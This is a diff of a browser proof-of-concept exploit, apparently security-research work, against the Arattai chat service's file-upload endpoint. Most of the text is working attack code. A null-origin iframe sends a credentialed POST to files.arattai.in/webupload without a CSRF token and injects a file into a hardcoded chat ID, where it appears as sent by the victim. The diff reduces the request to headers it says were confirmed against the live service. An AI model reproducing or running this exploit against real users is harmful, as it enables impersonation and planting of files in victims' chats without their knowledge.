@@ -11,67 +11,46 @@
 <script>
 document.getElementById('host').textContent = location.origin;
 
-// ── CONFIG ──────────────────────────────────────────────────────────────────
+// ── CONFIG ────────────────────────────────────────────────────────────────────
 const TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
 const FILE_NAME     = "important-invoice.txt";
-const FILE_BYTES    = "This file was uploaded without the victim's knowledge (PoC 05b).";
-// ────────────────────────────────────────────────────────────────────────────
+const FILE_BODY     = "This file was injected without the victim's knowledge (PoC 05b).";
+// ─────────────────────────────────────────────────────────────────────────────
 
-async function sha256hex(str) {
-    const buf    = new TextEncoder().encode(str);
-    const digest = await crypto.subtle.digest("SHA-256", buf);
-    return Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, "0")).join("");
-}
+// Minimal headers confirmed from live request — no Upload-Id, no hash body,
+// no CSRF token, no X-Dfs-Service / X-Streammode / X-Body_attr_size needed.
+var inner = '';
+inner += 'var xhr=new XMLHttpRequest();';
+inner += 'xhr.open("POST","https://files.arattai.in/webupload");';
+inner += 'xhr.withCredentials=true;';
+inner += 'xhr.setRequestHeader("X-Service","arattai");';
+inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
+inner += 'xhr.setRequestHeader("X-Arattai-Chatids",' + JSON.stringify(TARGET_CHATID) + ');';
+inner += 'xhr.setRequestHeader("File-Name",'          + JSON.stringify(FILE_NAME)     + ');';
+// X-Zcsrf-Token intentionally omitted
+inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
+inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"CORS preflight blocked or network error"},"*");};';
+inner += 'xhr.send(' + JSON.stringify(FILE_BODY) + ');';
+inner += 'parent.postMessage({type:"sent"},"*");';
 
-// Hash computed in parent (secure context) — passed as a ready string into the iframe.
-// This avoids relying on crypto.subtle inside the sandboxed srcdoc context.
-sha256hex(FILE_BYTES).then(function(refHash) {
-    var bodyAttrs = JSON.stringify({ reference_hash: refHash });
-    var fullBody  = bodyAttrs + FILE_BYTES;
-    var uploadId  = "attacker_" + Date.now();
-
-    var inner = '';
-    inner += 'var HOST='         + JSON.stringify("https://files.arattai.in") + ';';
-    inner += 'var TARGET_CHATID='+ JSON.stringify(TARGET_CHATID) + ';';
-    inner += 'var FILE_NAME='    + JSON.stringify(FILE_NAME)     + ';';
-    inner += 'var fullBody='     + JSON.stringify(fullBody)      + ';';
-    inner += 'var uploadId='     + JSON.stringify(uploadId)      + ';';
-    inner += 'var bodyAttrsLen=' + JSON.stringify(String(bodyAttrs.length)) + ';';
-    inner += 'var xhr=new XMLHttpRequest();';
-    inner += 'xhr.open("POST",HOST+"/webupload");';
-    inner += 'xhr.withCredentials=true;';                     // victim cookies sent (SameSite=None)
-    inner += 'xhr.setRequestHeader("X-Service","arattai");';
-    inner += 'xhr.setRequestHeader("X-Dfs-Service","zfs");';
-    inner += 'xhr.setRequestHeader("X-Streammode","1");';
-    inner += 'xhr.setRequestHeader("Upload-Id",uploadId);';
-    inner += 'xhr.setRequestHeader("File-Name",FILE_NAME);';
-    inner += 'xhr.setRequestHeader("X-Arattai-Chatids",TARGET_CHATID);';
-    inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
-    inner += 'xhr.setRequestHeader("X-Body_attr_size",bodyAttrsLen);';
-    inner += 'xhr.setRequestHeader("Content-Type","text/plain");';
-    // X-Zcsrf-Token intentionally omitted — testing whether server validates it
-    inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
-    inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"request failed (CORS preflight blocked or network error)"},"*");};';
-    inner += 'xhr.send(fullBody);';
-    inner += 'parent.postMessage({type:"sent",uploadId:uploadId},"*");';
-
-    document.getElementById('pwn').srcdoc = '<script>' + inner + '<\/script>';
-});
+document.getElementById('pwn').srcdoc = '<script>' + inner + '<\/script>';
 
 var log = document.getElementById('out');
 window.addEventListener('message', function(e) {
     var d = e.data;
     if (d.type === 'sent') {
-        log.textContent += '[SENT] POST /webupload  Upload-Id=' + d.uploadId + '  Origin: null\n';
-        log.textContent += '       X-Zcsrf-Token: (omitted — testing CSRF validation)\n';
+        log.textContent += '[SENT] POST /webupload  Origin: null\n';
+        log.textContent += '       File-Name: ' + FILE_NAME + '\n';
+        log.textContent += '       X-Arattai-Chatids: ' + TARGET_CHATID + '\n';
+        log.textContent += '       X-Zcsrf-Token: (omitted)\n\n';
     } else if (d.type === 'done') {
         log.textContent += '[RESPONSE] HTTP ' + d.status + '\n' + d.body + '\n';
         if (d.status === 200) {
-            log.textContent += '\n[CONFIRMED] Upload accepted without CSRF token via null-origin iframe.\n';
-            log.textContent += '            Check chat ' + TARGET_CHATID + ' — file should appear as sent by victim.\n';
-            log.textContent += '            CLEANUP: delete the injected attachment from the chat after testing.\n';
+            log.textContent += '\n[CONFIRMED] File injected into chat without CSRF token.\n';
+            log.textContent += '            Check: ' + TARGET_CHATID + '\n';
+            log.textContent += '            CLEANUP: delete the injected file from the chat.\n';
         } else {
-            log.textContent += '[RESULT] HTTP ' + d.status + ' — server rejected the request.\n';
+            log.textContent += '[RESULT] HTTP ' + d.status + ' — rejected.\n';
         }
     } else if (d.type === 'err') {
         log.textContent += '[BLOCKED] ' + d.msg + '\n';
